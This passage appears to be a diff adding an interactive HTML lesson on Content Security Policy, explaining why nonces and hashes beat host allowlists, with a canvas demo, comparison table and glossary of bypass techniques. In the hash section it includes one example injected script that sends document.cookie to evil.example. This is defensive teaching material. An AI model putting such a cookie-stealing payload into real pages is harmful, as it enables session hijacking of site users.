+  <pre class="reveal"><span class="tag">why attackers can't forge a hash</span><code><span class="cm">// Allowed by policy: 'sha256-qznLcsROx4GACP2dm0UCKCzCG+HiZ1guq6ZZDob/Tng='</span>
+<span class="cm">// which is SHA-256("var x = 1;")</span>
+
+<span class="cm">// Attacker's injected script has DIFFERENT content:</span>
+<span class="kw">&lt;script&gt;</span><span class="fn">fetch</span>(<span class="str">'https://evil.example?c='</span>+document.cookie)<span class="kw">&lt;/script&gt;</span>
+<span class="cm">// SHA-256 of THIS content is a completely different, unrelated hash —</span>
+<span class="cm">// not "close", not "similar" — cryptographically unrelated.</span>
+<span class="cm">// It will never appear in the policy's allowlist unless the site</span>
+<span class="cm">// owner explicitly added it, which they would only do for code</span>
+<span class="cm">// they wrote and reviewed themselves.</span>
+<span class="cm">// → BLOCKED, same as if it had no hash at all.</span></code></pre>
+</div>
+</section>
+
+<!-- SECTION 6: LIVE DEMO CANVAS -->
+<section id="demo">
+<div class="container">
+  <div class="section-num">06 — See It Happen</div>
+  <h2>The <span class="accent r">Nonce Checkpoint</span>, Live</h2>
+
+  <p class="reveal">Same page, same CSP header, two different scripts arriving. One is the attacker's injected payload — no nonce, because they were never handed one. The other is the page's own legitimate script, carrying the exact nonce the server generated for this response. Watch what the checkpoint does with each.</p>
+
+  <div class="canvas-wrap reveal">
+    <div class="canvas-label" id="nonceLabel">▶ Watch the nonce checkpoint decide — click a button to run</div>
+    <canvas id="nonceCanvas" height="330"></canvas>
+  </div>
+  <div class="controls reveal">
+    <button class="ctrl-btn red" onclick="runNonce('attacker')">▶ Run injected script (no nonce)</button>
+    <button class="ctrl-btn green" onclick="runNonce('legit')">▶ Run legitimate script (matching nonce)</button>
+    <button class="ctrl-btn" onclick="resetNonce()">Reset</button>
+  </div>
+
+  <div class="callout cyan reveal">
+    <div class="callout-title">📌 What To Notice</div>
+    The attacker's script in this demo isn't loaded from some obviously untrusted domain — that's the whole point of this lesson. It could be sitting right there in the page's own HTML, injected via the exact same escaping bug from the companion lesson. What stops it isn't where it is. It's that it never carries the one value that couldn't be predicted in advance.
+  </div>
+</div>
+</section>
+
+<!-- SECTION 7: COMPARE ALL THREE -->
+<section id="compare">
+<div class="container">
+  <div class="section-num">07 — The Full Picture</div>
+  <h2>Allowlist vs. <span class="accent r">Nonce</span> vs. <span class="accent r">Hash</span></h2>
+
+  <p class="reveal">All three are valid <code>script-src</code> source expressions. They are not, however, equally strong — and the reason is always the same underlying idea: <strong>the first authenticates a location; the other two authenticate the script itself.</strong></p>
+
+  <div class="compare-grid reveal">
+    <div class="compare-card bad">
+      <h4>🌐 Host Allowlist</h4>
+      <p style="margin-bottom:.6rem;font-size:.9rem;"><code>script-src https://cdn.example.com</code></p>
+      Trusts anything served from that origin, forever, regardless of content. Vulnerable to JSONP reflection, open redirects, vulnerable library versions, subdomain takeover, and any other "trusted origin, untrusted content" gap on that host.
+    </div>
+    <div class="compare-card mid">
+      <h4>🔑 Nonce</h4>
+      <p style="margin-bottom:.6rem;font-size:.9rem;"><code>script-src 'nonce-RANDOM'</code></p>
+      Trusts any script tag carrying a per-response secret token, regardless of origin. Works well for both static and dynamically-generated scripts. Requires server-side templating support and truly fresh randomness every response.
+    </div>
+    <div class="compare-card good">
+      <h4>🔒 Hash</h4>
+      <p style="margin-bottom:.6rem;font-size:.9rem;"><code>script-src 'sha256-HASH'</code></p>
+      Trusts scripts whose exact byte content matches a precomputed value, regardless of origin or timing. No server-side per-request logic needed at all — but only practical for content that's fixed at build time.
+    </div>
+  </div>
+
+  <div class="data-table-wrap reveal">
+    <table>
+      <thead><tr><th>Property</th><th>Host Allowlist</th><th>Nonce</th><th>Hash</th></tr></thead>
+      <tbody>
+        <tr><td class="gold">What it authenticates</td><td class="neg">Where the script claims to load from</td><td class="pos">Possession of a per-response secret</td><td class="pos">The script's exact content</td></tr>
+        <tr><td class="gold">Vulnerable to JSONP reflection</td><td class="neg">Yes</td><td class="pos">No</td><td class="pos">No</td></tr>
+        <tr><td class="gold">Vulnerable to open redirect</td><td class="neg">Yes</td><td class="pos">No</td><td class="pos">No</td></tr>
+        <tr><td class="gold">Vulnerable to subdomain takeover</td><td class="neg">Yes, if wildcarded</td><td class="pos">No</td><td class="pos">No</td></tr>
+        <tr><td class="gold">Works for dynamically-rendered inline scripts</td><td class="hl">N/A</td><td class="pos">Yes</td><td class="neg">No — content must be fixed</td></tr>
+        <tr><td class="gold">Works with zero server-side logic</td><td class="pos">Yes</td><td class="neg">No — needs fresh randomness per response</td><td class="hl">Yes, once precomputed</td></tr>
+        <tr><td class="gold">Breaks silently on a minifier reformat</td><td class="pos">No</td><td class="pos">No</td><td class="neg">Yes — hash mismatch fails closed</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="callout green reveal">
+    <div class="callout-title">✅ The One-Sentence Summary</div>
+    <strong>A host allowlist asks "did this come from somewhere I trust," which an attacker can satisfy by finding any exploitable feature on that host — but a nonce or hash asks "is this the exact script I meant to run," a question an attacker can't answer correctly no matter which origin they attack from.</strong>
+  </div>
+</div>
+</section>
+
+<!-- SECTION 8: GLOSSARY -->
+<section id="glossary">
+<div class="container">
+  <div class="section-num">08 — Quick Reference</div>
+  <h2>Glossary &amp; <span class="accent r">Key Terms</span></h2>
+
+  <div class="glossary-grid reveal">
+    <div class="glossary-card"><div class="glossary-term">Host Allowlist</div><div class="glossary-def">A script-src value naming an origin — trusts anything served from that origin, regardless of content, making it as strong as the weakest endpoint on that host.</div></div>
+    <div class="glossary-card"><div class="glossary-term">JSONP Bypass</div><div class="glossary-def">Abusing a legacy JSONP endpoint's unescaped callback parameter to turn an allowlisted host into a source of attacker-controlled JavaScript.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Open Redirect Bypass</div><div class="glossary-def">Using an allowlisted host's own redirect endpoint to have the browser's initial (trusted-origin) request end up fetching a script from attacker infrastructure.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Nonce</div><div class="glossary-def">A random, single-use, per-response token embedded in both the CSP header and a script tag's nonce attribute — only scripts carrying the exact match execute.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Hash-Based CSP</div><div class="glossary-def">A source expression naming the exact cryptographic hash (SHA-256/384/512) of an allowed inline script's content — any different content produces a different hash and is blocked.</div></div>
+    <div class="glossary-card"><div class="glossary-term">strict-dynamic</div><div class="glossary-def">A script-src keyword that extends trust from a nonce/hash-verified script to scripts it dynamically loads, while making plain origin allowlists irrelevant.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Subdomain Takeover</div><div class="glossary-def">Registering or claiming an abandoned subdomain (expired DNS, orphaned cloud bucket) that a wildcard CSP entry still trusts, turning it into an attacker-controlled origin.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Fail Closed</div><div class="glossary-def">The security property that a mismatch (wrong nonce, wrong hash, unlisted origin) results in the resource being blocked by default, not silently allowed.</div></div>
+    <div class="glossary-card"><div class="glossary-term">'unsafe-inline'</div><div class="glossary-def">A script-src keyword that permits all inline scripts unconditionally — effectively disabling CSP's script protection rather than narrowing it.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Gadget Bypass</div><div class="glossary-def">Exploiting an existing, allowlisted script's own bug (an unsafe eval, a JSONP-like reflection) as a stepping stone to executing attacker-chosen code within the policy's trust.</div></div>
+    <div class="glossary-card"><div class="glossary-term">Content-Type Sniffing</div><div class="glossary-def">A browser guessing a resource's type from its content rather than trusting the declared header — historically another way an "image upload" endpoint could be coerced into serving executable script.</div></div>
+    <div class="glossary-card"><div class="glossary-term">CSP Level 3</div><div class="glossary-def">The specification version that introduced strict-dynamic and formalized nonce/hash precedence over plain host expressions — the recommended baseline for any new policy.</div></div>
+  </div>
+
+  <p class="reveal" style="margin-top:1.5rem;">Every bypass in this lesson shares one root cause: an allowlist authenticates a <em>place</em>, and places are bigger and messier than they look from the outside. Nonces and hashes sidestep that entire category of problem by authenticating something an attacker can never possess no matter which origin, endpoint, or forgotten subdomain they find.</p>
+</div>
+</section>
+
+<footer>
+  <p>CSP Bypass Techniques, and Why Nonces/Hashes Beat Allowlists · companion lesson for <a href="../../browser/B13_csp/tutorial.html">bob_os/browser module B13_csp</a></p>
+  <p style="margin-top:.5rem;font-size:.78rem">An allowlist trusts a place. A nonce or hash trusts a fact.</p>
+</footer>
+
+<script>
+const C={bg:'#060d1a',bg2:'#0b0f1a',bg3:'#1a2235',border:'#1e3a5f',gold:'#f5c842',cyan:'#38bdf8',teal:'#0d9488',red:'#f87171',green:'#4ade80',purple:'#a78bfa',muted:'#7a9bbf',orange:'#fb923c',text:'#e2e8f0'};
+
+function dpr(canvas,w,h){const d=window.devicePixelRatio||1;canvas.width=w*d;canvas.height=h*d;canvas.style.width=w+'px';canvas.style.height=h+'px';const ctx=canvas.getContext('2d');ctx.scale(d,d);return ctx;}
+function gW(c){return c.parentElement.getBoundingClientRect().width;}
+
+function wrapText(ctx,text,cx,y,maxW,lh){
+  const words=text.split(' ');
+  let line='',lines=[];
+  words.forEach(w=>{
+    const test=line?line+' '+w:w;
+    if(ctx.measureText(test).width>maxW && line){lines.push(line);line=w;}
+    else line=test;
+  });
+  if(line) lines.push(line);
+  lines.forEach((l,i)=>ctx.fillText(l,cx,y+i*lh));
+  return lines.length;
+}
+
+// ── NONCE CHECKPOINT CANVAS ────────────────────────────────────────────────
+function drawNonceScene(t,phase,kind){
+  const canvas=document.getElementById('nonceCanvas');
+  const W=gW(canvas),H=330;
+  const ctx=dpr(canvas,W,H);
+  ctx.fillStyle=C.bg;ctx.fillRect(0,0,W,H);
+
+  const leftX=0, leftW=W*0.34, wallX=leftW, wallW=W*0.24, rightX=leftW+wallW, rightW=W-rightX;
+  const attacker = kind==='attacker';
+  const zoneCol = attacker ? C.red : C.green;
+
+  // left zone: incoming script
+  ctx.fillStyle='rgba(56,189,248,.06)';ctx.fillRect(leftX,20,leftW,H-80);
+  ctx.strokeStyle=C.cyan;ctx.lineWidth=1.5;ctx.strokeRect(leftX+2,20,leftW-4,H-80);
+  ctx.fillStyle=C.cyan;ctx.font='bold 11px Source Code Pro,monospace';ctx.textAlign='center';
+  ctx.fillText('INCOMING <script>',leftX+leftW/2,40);
+  ctx.font='9px Source Code Pro,monospace';ctx.fillStyle=zoneCol;
+  const tagText = attacker
+    ? '<script>fetch(evil,cookie)</script>'
+    : '<script nonce="8f4A2x…">';
+  wrapText(ctx, tagText, leftX+leftW/2, 65, leftW-14, 13);
+  ctx.font='9px Lato,sans-serif';ctx.fillStyle=C.muted;
+  ctx.fillText(attacker?'no nonce attribute present':'carries a nonce attribute', leftX+leftW/2, H-96);
+
+  // middle: checkpoint wall
+  ctx.fillStyle='rgba(167,139,250,.08)';ctx.fillRect(wallX,20,wallW,H-80);
+  ctx.strokeStyle=C.purple;ctx.setLineDash([4,4]);ctx.strokeRect(wallX+1,20,wallW-2,H-80);ctx.setLineDash([]);
+  ctx.save();ctx.translate(wallX+wallW/2,H/2-25);ctx.rotate(-Math.PI/2);
+  ctx.fillStyle=C.purple;ctx.font='bold 10px Source Code Pro,monospace';ctx.textAlign='center';
+  ctx.fillText('NONCE CHECKPOINT',0,0);ctx.restore();
+  ctx.fillStyle=C.muted;ctx.font='9px Source Code Pro,monospace';ctx.textAlign='center';
+  ctx.fillText("header requires:",wallX+wallW/2,H-108);
+  ctx.fillStyle=C.gold;
+  ctx.fillText("nonce-8f4A2xQ9pLk3vR7z",wallX+wallW/2,H-96);
+
+  // right: result zone
+  ctx.fillStyle=attacker?'rgba(248,113,113,.08)':'rgba(74,222,128,.08)';
+  ctx.fillRect(rightX,20,rightW,H-80);
+  ctx.strokeStyle=zoneCol;ctx.lineWidth=1.5;ctx.strokeRect(rightX+2,20,rightW-4,H-80);
+  ctx.fillStyle=zoneCol;ctx.font='bold 12px Source Code Pro,monospace';ctx.textAlign='center';
+  ctx.fillText(attacker?'BLOCKED':'EXECUTES',rightX+rightW/2,40);
+
+  const captions={
+    idle:'Click a button to send a script through the checkpoint',
+    arrive:'Script tag reaches the browser’s parser',
+    check:'Browser compares the tag’s nonce attribute to the CSP header value',
+    result: attacker
+      ? 'No nonce to compare — automatic rejection, no guess was even possible'
+      : 'Exact match — the browser proceeds to fetch and execute the script'
+  };
+  ctx.fillStyle=C.text;ctx.font='12px Lato,sans-serif';ctx.textAlign='center';
+  ctx.fillText(captions[phase]||'',W/2,H-16);
+  ctx.font='10px Lato,sans-serif';ctx.fillStyle=C.muted;
+  if(phase==='result'){
+    const sub = attacker
+      ? 'console: Refused to execute inline script — no \'nonce-...\' source matches'
+      : 'console: (no violation)';
+    ctx.fillText(sub,W/2,H-32);
+  }
+
+  let dotX=leftX+leftW*0.5, dotY=H/2-25, dotCol=C.cyan;
+  if(phase==='arrive'){dotX=leftX+leftW*(0.3+0.4*t);dotY=H/2-25;dotCol=C.cyan;}
+  else if(phase==='check'){dotX=leftX+leftW*0.7+(wallW)*t;dotY=H/2-25;dotCol=C.purple;}
+  else if(phase==='result'){
+    if(attacker){
+      dotX=wallX+wallW*0.8; dotY=H/2-25;
+      ctx.beginPath();ctx.arc(dotX,dotY,9,0,Math.PI*2);ctx.fillStyle=C.red;ctx.fill();
+      ctx.strokeStyle='#fff';ctx.lineWidth=2;ctx.stroke();
+      ctx.beginPath();ctx.moveTo(dotX-5,dotY-5);ctx.lineTo(dotX+5,dotY+5);ctx.moveTo(dotX+5,dotY-5);ctx.lineTo(dotX-5,dotY+5);
+      ctx.strokeStyle='#fff';ctx.lineWidth=2;ctx.stroke();
+      return;
+    } else {
+      dotX=rightX+(rightW*0.5)*t; dotY=H/2-25; dotCol=C.green;
+    }
+  }
+  ctx.beginPath();ctx.arc(dotX,dotY,8,0,Math.PI*2);ctx.fillStyle=dotCol;ctx.fill();
+  ctx.strokeStyle='#fff';ctx.lineWidth=1;ctx.stroke();
+}
+
+function runNonce(kind){
+  const phases=['arrive','check','result'];
+  const durations=[500,550,700];
+  let idx=0,start=performance.now();
+  document.getElementById('nonceLabel').textContent = kind==='attacker'
+    ? '▶ Running: attacker’s injected script (no nonce)'
+    : '▶ Running: legitimate script (matching nonce)';
+  function step(now){
+    const elapsed=now-start;
+    const t=Math.min(1,elapsed/durations[idx]);
+    drawNonceScene(t,phases[idx],kind);
+    if(t>=1){
+      idx++;
+      if(idx>=phases.length){
+        document.getElementById('nonceLabel').textContent='▶ Complete — click a button to run again';
+        return;
+      }
+      start=now;
+    }
+    requestAnimationFrame(step);
+  }
+  requestAnimationFrame(step);
+}
+function resetNonce(){
+  document.getElementById('nonceLabel').textContent='▶ Watch the nonce checkpoint decide — click a button to run';
+  drawNonceScene(0,'idle','legit');
+}
+
+// ── SCROLL REVEAL ──────────────────────────────────────────────────────────────
+const obs=new IntersectionObserver(es=>{es.forEach(e=>{if(e.isIntersecting)e.target.classList.add('visible');});},{threshold:.07});
+document.querySelectorAll('.reveal').forEach(el=>obs.observe(el));
+const secs=document.querySelectorAll('section[id]');
+const dots=document.querySelectorAll('.toc-dot');
+const tocObs=new IntersectionObserver(es=>{es.forEach(e=>{if(e.isIntersecting){dots.forEach(d=>d.classList.remove('active'));const d=document.querySelector(`.toc-dot[href="#${e.target.id}"]`);if(d)d.classList.add('active');}});},{threshold:.4});
+secs.forEach(s=>tocObs.observe(s));
+
+window.addEventListener('load',()=>{ resetNonce(); });
+window.addEventListener('resize',()=>{ resetNonce(); });
+</script>
+</body>
+</html>
